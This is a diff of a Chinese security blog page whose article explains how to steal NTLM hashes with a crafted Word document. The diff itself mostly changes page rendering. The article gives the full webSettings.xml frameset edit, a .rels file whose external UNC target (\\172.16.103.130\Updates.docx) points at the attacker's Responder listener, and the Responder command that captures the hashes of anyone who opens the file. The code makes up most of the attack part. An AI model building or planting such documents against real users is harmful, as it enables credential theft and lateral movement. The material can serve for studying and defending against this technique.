@@ -1,4 +1,21 @@
-<!DOCTYPE html><html class="theme-next pisces use-motion" lang="zh-CN"><head><meta name="generator" content="Hexo 3.9.0">
+<!DOCTYPE html>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="zh-CN">
+<head><meta name="generator" content="Hexo 3.9.0">
   <meta charset="UTF-8">
 <meta http-equiv="X-UA-Compatible" content="IE=edge">
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
@@ -68,7 +85,7 @@
     back2top_sidebar: false,
     fancybox: true,
     fastclick: true,
-    lazyload: true,
+    lazyload: false,
     tabs: true,
     motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
     algolia: {
@@ -92,16 +109,16 @@
 <meta property="og:type" content="article">
 <meta property="og:title" content="通过Microsoft Office 窃取 NTLM Hashes">
 <meta property="og:url" content="https://evi1cg.github.io/archives/Get_NTLM_Hashes.html">
-<meta property="og:site_name" content="Evi1cg's blog">
+<meta property="og:site_name" content="Evi1cg&#39;s blog">
 <meta property="og:description" content="之前有人总结了很多种窃取NTLM hash的方法，原文,译文。里面写的方法已经很多了，最近从这里又学到了一个新的方法，所以在这里进行一下分享，也算是一个补充。 历史上，Microsoft Word被用作HTML编辑器。这意味着它可以支持HTML元素，例如框架集。因此，可以将Microsoft Word文档与UNC路径链接起来，并将其与响应程序结合，以便从外部捕获NTLM哈希值。带有docx扩展名的">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:image" content="https://evi1cg.github.io/images/loading.svg">
-<meta property="og:image" content="https://evi1cg.github.io/images/loading.svg">
+<meta property="og:image" content="https://evi1cg.github.io/usr/uploads/2017/12/72758607.png">
+<meta property="og:image" content="https://evi1cg.github.io/usr/uploads/2017/12/2707838865.png">
 <meta property="og:updated_time" content="2019-01-15T05:43:36.769Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="通过Microsoft Office 窃取 NTLM Hashes">
 <meta name="twitter:description" content="之前有人总结了很多种窃取NTLM hash的方法，原文,译文。里面写的方法已经很多了，最近从这里又学到了一个新的方法，所以在这里进行一下分享，也算是一个补充。 历史上，Microsoft Word被用作HTML编辑器。这意味着它可以支持HTML元素，例如框架集。因此，可以将Microsoft Word文档与UNC路径链接起来，并将其与响应程序结合，以便从外部捕获NTLM哈希值。带有docx扩展名的">
-<meta name="twitter:image" content="https://evi1cg.github.io/images/loading.svg">
+<meta name="twitter:image" content="https://evi1cg.github.io/usr/uploads/2017/12/72758607.png">
 
 
 
@@ -481,17 +498,17 @@
       
 
       
-        <meta name="generator" content="Hexo 3.9.0"><p>之前有人总结了很多种窃取NTLM hash的方法，<a href="https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/" target="_blank" rel="noopener">原文</a>,<a href="https://paper.seebug.org/474/" target="_blank" rel="noopener">译文</a>。里面写的方法已经很多了，最近从<a href="https://pentestlab.blog/2017/12/18/microsoft-office-ntlm-hashes-via-frameset/" target="_blank" rel="noopener">这里</a>又学到了一个新的方法，所以在这里进行一下分享，也算是一个补充。</p>
+        <p>之前有人总结了很多种窃取NTLM hash的方法，<a href="https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/" target="_blank" rel="noopener">原文</a>,<a href="https://paper.seebug.org/474/" target="_blank" rel="noopener">译文</a>。里面写的方法已经很多了，最近从<a href="https://pentestlab.blog/2017/12/18/microsoft-office-ntlm-hashes-via-frameset/" target="_blank" rel="noopener">这里</a>又学到了一个新的方法，所以在这里进行一下分享，也算是一个补充。</p>
 <p>历史上，Microsoft Word被用作HTML编辑器。这意味着它可以支持HTML元素，例如框架集。因此，可以将Microsoft Word文档与UNC路径链接起来，并将其与响应程序结合，以便从外部捕获NTLM哈希值。带有docx扩展名的Word文档实际上是一个包含各种XML文档的zip文件。这些XML文件正在控制主题，字体，文档的设置和Web设置。</p>
 <p>所以我们可以新建一个任意文档，并用压缩包来打开他。</p>
-<p></p><div class="progress-images" style="width:1082px"><div class="progress-images--placeholder" style="padding-bottom: 77.26432532347505%;"></div><img src="/images/loading.svg" alt="1513736341443.png" class="progress-images--original" data-original="https://evi1cg.github.io/usr/uploads/2017/12/72758607.png" data-thumb="/images/thumb/7404af72040648008c7a2cce332a6a84.png"></div><p></p>
-<p>在<em><code>word</code></em> 目录下有一个webSettings.xml。我们对这个文件进行修改，添加以下代码则会创建与另外一个文件的链接。<br></p><figure class="highlight xml"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag"><<span class="name">w:frameset</span>></span></span><br><span class="line"><span class="tag"><<span class="name">w:framesetSplitbar</span>></span></span><br><span class="line"><span class="tag"><<span class="name">w:w</span> <span class="attr">w:val</span>=<span class="string">"60"</span>/></span></span><br><span class="line"><span class="tag"><<span class="name">w:color</span> <span class="attr">w:val</span>=<span class="string">"auto"</span>/></span></span><br><span class="line"><span class="tag"><<span class="name">w:noBorder</span>/></span></span><br><span class="line"><span class="tag">w:framesetSplitbar</span>></span><br><span class="line"><span class="tag"><<span class="name">w:frameset</span>></span></span><br><span class="line"><span class="tag"><<span class="name">w:frame</span>></span></span><br><span class="line"><span class="tag"><<span class="name">w:name</span> <span class="attr">w:val</span>=<span class="string">"3"</span>/></span></span><br><span class="line"><span class="tag"><<span class="name">w:sourceFileName</span> <span class="attr">r:id</span>=<span class="string">"rId1"</span>/></span></span><br><span class="line"><span class="tag"><<span class="name">w:linkedToFile</span>/></span></span><br><span class="line"><span class="tag">w:frame</span>></span><br><span class="line"><span class="tag">w:frameset</span>></span><br><span class="line"><span class="tag">w:frameset</span>></span><br></pre></td></tr></tbody></table></figure><p></p>
-<p>最终修改后的webSettings.xml如下：<br></p><figure class="highlight xml"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"><!--?xml version="1.0" encoding="UTF-8" standalone="yes"?--></span></span><br><span class="line"><span class="tag"><<span class="name">w:webSettings</span> <span class="attr">xmlns:mc</span>=<span class="string">"http://schemas.openxmlformats.org/markup-compatibility/2006"</span> <span class="attr">xmlns:r</span>=<span class="string">"http://schemas.openxmlformats.org/officeDocument/2006/relationships"</span> <span class="attr">xmlns:w</span>=<span class="string">"http://schemas.openxmlformats.org/wordprocessingml/2006/main"</span> <span class="attr">xmlns:w14</span>=<span class="string">"http://schemas.microsoft.com/office/word/2010/wordml"</span> <span class="attr">mc:Ignorable</span>=<span class="string">"w14"</span>></span></span><br><span class="line">	<span class="tag"><<span class="name">w:frameset</span>></span></span><br><span class="line"><span class="tag"><<span class="name">w:framesetSplitbar</span>></span></span><br><span class="line"><span class="tag"><<span class="name">w:w</span> <span class="attr">w:val</span>=<span class="string">"60"</span>/></span></span><br><span class="line"><span class="tag"><<span class="name">w:color</span> <span class="attr">w:val</span>=<span class="string">"auto"</span>/></span></span><br><span class="line"><span class="tag"><<span class="name">w:noBorder</span>/></span></span><br><span class="line"><span class="tag">w:framesetSplitbar</span>></span><br><span class="line"><span class="tag"><<span class="name">w:frameset</span>></span></span><br><span class="line"><span class="tag"><<span class="name">w:frame</span>></span></span><br><span class="line"><span class="tag"><<span class="name">w:name</span> <span class="attr">w:val</span>=<span class="string">"3"</span>/></span></span><br><span class="line"><span class="tag"><<span class="name">w:sourceFileName</span> <span class="attr">r:id</span>=<span class="string">"rId1"</span>/></span></span><br><span class="line"><span class="tag"><<span class="name">w:linkedToFile</span>/></span></span><br><span class="line"><span class="tag">w:frame</span>></span><br><span class="line"><span class="tag">w:frameset</span>></span><br><span class="line"><span class="tag">w:frameset</span>></span><br><span class="line"><span class="tag"><<span class="name">w:optimizeForBrowser</span>/></span><span class="tag"><<span class="name">w:allowPNG</span>/></span><span class="tag">w:webSettings</span>></span><br></pre></td></tr></tbody></table></figure><p></p>
-<p>现在我们把新的webSettings.xml替换原来的webSettings.xml，之后在word目录下的_rels目录创建一个新的文件 <em><code>webSettings.xml.rels</code></em>，文件内容如下：<br></p><figure class="highlight xml"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"><!--?xml version="1.0" encoding="UTF-8" standalone="yes"?--></span></span><br><span class="line"><span class="tag"><<span class="name">Relationships</span></span></span><br><span class="line"><span class="tag"><span class="attr">xmlns</span>=<span class="string">"http://schemas.openxmlformats.org/package/2006/relationships"</span>></span></span><br><span class="line"><span class="tag"><<span class="name">Relationship</span> <span class="attr">Id</span>=<span class="string">"rId1"</span> <span class="attr">Type</span>=<span class="string">"http://schemas.openxmlformats.org/officeDocument/2006/relationships/frame"</span> <span class="attr">Target</span>=<span class="string">"\\172.16.103.130\Updates.docx"</span> <span class="attr">TargetMode</span>=<span class="string">"External"</span>/></span></span><br><span class="line"><span class="tag">Relationships</span>></span><br></pre></td></tr></tbody></table></figure><p></p>
+<p><img src="https://evi1cg.github.io/usr/uploads/2017/12/72758607.png" alt="1513736341443.png"></p>
+<p>在<em><code>word</code></em> 目录下有一个webSettings.xml。我们对这个文件进行修改，添加以下代码则会创建与另外一个文件的链接。<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">w:frameset</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">w:framesetSplitbar</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">w:w</span> <span class="attr">w:val</span>=<span class="string">"60"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">w:color</span> <span class="attr">w:val</span>=<span class="string">"auto"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">w:noBorder</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">w:framesetSplitbar</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">w:frameset</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">w:frame</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">w:name</span> <span class="attr">w:val</span>=<span class="string">"3"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">w:sourceFileName</span> <span class="attr">r:id</span>=<span class="string">"rId1"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">w:linkedToFile</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">w:frame</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">w:frameset</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">w:frameset</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>最终修改后的webSettings.xml如下：<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8" standalone="yes"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">w:webSettings</span> <span class="attr">xmlns:mc</span>=<span class="string">"http://schemas.openxmlformats.org/markup-compatibility/2006"</span> <span class="attr">xmlns:r</span>=<span class="string">"http://schemas.openxmlformats.org/officeDocument/2006/relationships"</span> <span class="attr">xmlns:w</span>=<span class="string">"http://schemas.openxmlformats.org/wordprocessingml/2006/main"</span> <span class="attr">xmlns:w14</span>=<span class="string">"http://schemas.microsoft.com/office/word/2010/wordml"</span> <span class="attr">mc:Ignorable</span>=<span class="string">"w14"</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">w:frameset</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">w:framesetSplitbar</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">w:w</span> <span class="attr">w:val</span>=<span class="string">"60"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">w:color</span> <span class="attr">w:val</span>=<span class="string">"auto"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">w:noBorder</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">w:framesetSplitbar</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">w:frameset</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">w:frame</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">w:name</span> <span class="attr">w:val</span>=<span class="string">"3"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">w:sourceFileName</span> <span class="attr">r:id</span>=<span class="string">"rId1"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">w:linkedToFile</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">w:frame</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">w:frameset</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">w:frameset</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">w:optimizeForBrowser</span>/&gt;</span><span class="tag">&lt;<span class="name">w:allowPNG</span>/&gt;</span><span class="tag">&lt;/<span class="name">w:webSettings</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>现在我们把新的webSettings.xml替换原来的webSettings.xml，之后在word目录下的_rels目录创建一个新的文件 <em><code>webSettings.xml.rels</code></em>，文件内容如下：<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8" standalone="yes"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Relationships</span></span></span><br><span class="line"><span class="tag"><span class="attr">xmlns</span>=<span class="string">"http://schemas.openxmlformats.org/package/2006/relationships"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Relationship</span> <span class="attr">Id</span>=<span class="string">"rId1"</span> <span class="attr">Type</span>=<span class="string">"http://schemas.openxmlformats.org/officeDocument/2006/relationships/frame"</span> <span class="attr">Target</span>=<span class="string">"\\172.16.103.130\Updates.docx"</span> <span class="attr">TargetMode</span>=<span class="string">"External"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">Relationships</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
 <p>在这里包含了UNC路径。指向我们的Responder。</p>
-<p>之后把文档重新命名为docx。开启Responder<br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python Responder.py -I eth0 -wrf</span><br></pre></td></tr></tbody></table></figure><p></p>
+<p>之后把文档重新命名为docx。开启Responder<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python Responder.py -I eth0 -wrf</span><br></pre></td></tr></table></figure></p>
 <p>打开word，则可获取到hash</p>
-<p></p><div class="progress-images" style="width:2456px"><div class="progress-images--placeholder" style="padding-bottom: 46.579804560260584%;"></div><img src="/images/loading.svg" alt="1513737175195.png" class="progress-images--original" data-original="https://evi1cg.github.io/usr/uploads/2017/12/2707838865.png" data-thumb="/images/thumb/d55a1b82fb46554479807a7be23b244c.png"></div><p></p>
+<p><img src="https://evi1cg.github.io/usr/uploads/2017/12/2707838865.png" alt="1513737175195.png"></p>
 <p>当然，使用DDE的方式以及CVE-2017-0199等其他的方式都是可以的。</p>
 
       
@@ -839,7 +856,7 @@
                   
                     
                   
-                  <a href="https://github.com/Ridter" title="GitHub → https://github.com/Ridter" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
+                  <a href="https://github.com/Ridter" title="GitHub &rarr; https://github.com/Ridter" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
                 </span>
               
                 <span class="links-of-author-item">
@@ -850,7 +867,7 @@
                   
                     
                   
-                  <a href="https://twitter.com/Evi1cg" title="Twitter → https://twitter.com/Evi1cg" rel="noopener" target="_blank"><i class="fa fa-fw fa-twitter"></i>Twitter</a>
+                  <a href="https://twitter.com/Evi1cg" title="Twitter &rarr; https://twitter.com/Evi1cg" rel="noopener" target="_blank"><i class="fa fa-fw fa-twitter"></i>Twitter</a>
                 </span>
               
                 <span class="links-of-author-item">
@@ -861,7 +878,7 @@
                   
                     
                   
-                  <a href="https://weibo.com/Ridter" title="微博 → https://weibo.com/Ridter" rel="noopener" target="_blank"><i class="fa fa-fw fa-weibo"></i>微博</a>
+                  <a href="https://weibo.com/Ridter" title="微博 &rarr; https://weibo.com/Ridter" rel="noopener" target="_blank"><i class="fa fa-fw fa-weibo"></i>微博</a>
                 </span>
               
                 <span class="links-of-author-item">
@@ -872,7 +889,7 @@
                   
                     
                   
-                  <a href="mailto:zuotonghk@gmail.com" title="E-Mail → mailto:zuotonghk@gmail.com" rel="noopener" target="_blank"><i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+                  <a href="mailto:zuotonghk@gmail.com" title="E-Mail &rarr; mailto:zuotonghk@gmail.com" rel="noopener" target="_blank"><i class="fa fa-fw fa-envelope"></i>E-Mail</a>
                 </span>
               
             </div>
@@ -907,7 +924,7 @@
 
     <footer id="footer" class="footer">
       <div class="footer-inner">
-        <div class="copyright">© 2015 – <span itemprop="copyrightYear">2019</span>
+        <div class="copyright">&copy; 2015 – <span itemprop="copyrightYear">2019</span>
   <span class="with-love" id="animate">
     <i class="fa fa-heart"></i>
   </span>
@@ -969,8 +986,6 @@
 
 
 
-  
-
 
 
 
@@ -999,9 +1014,6 @@
 
   
   <script src="//cdn.jsdelivr.net/npm/fastclick@1/lib/fastclick.min.js"></script>
-
-  
-  <script src="//cdn.jsdelivr.net/npm/jquery-lazyload@1/jquery.lazyload.min.js"></script>
 
   
   <script src="//cdn.jsdelivr.net/npm/velocity-animate@1/velocity.min.js"></script>
@@ -1445,11 +1457,6 @@
   
 
   
-  
-  
-  <script src="/lib/pangu/dist/pangu.min.js?v=3.3"></script>
-  <script>pangu.spacingPage();</script>
-
 
   
 
@@ -1589,6 +1596,5 @@
   <script>
   $("body").backstretch("https://blogpics-1251691280.file.myqcloud.com/imgs/20190121234042.jpg");
   </script>
-<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"log":false,"model":{"jsonPath":"/live2dw/assets/z16.model.json"},"display":{"position":"left","width":80,"height":120,"hOffset":30,"vOffset":0},"mobile":{"show":true}});</script>
-
-<script type="text/javascript" charset="utf-8" src="/js/lazyload-plugin/lazyload.intersectionObserver.min.js"></script></body></html>
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"log":false,"model":{"jsonPath":"/live2dw/assets/z16.model.json"},"display":{"position":"left","width":80,"height":120,"hOffset":30,"vOffset":0},"mobile":{"show":true}});</script></body>
+</html>
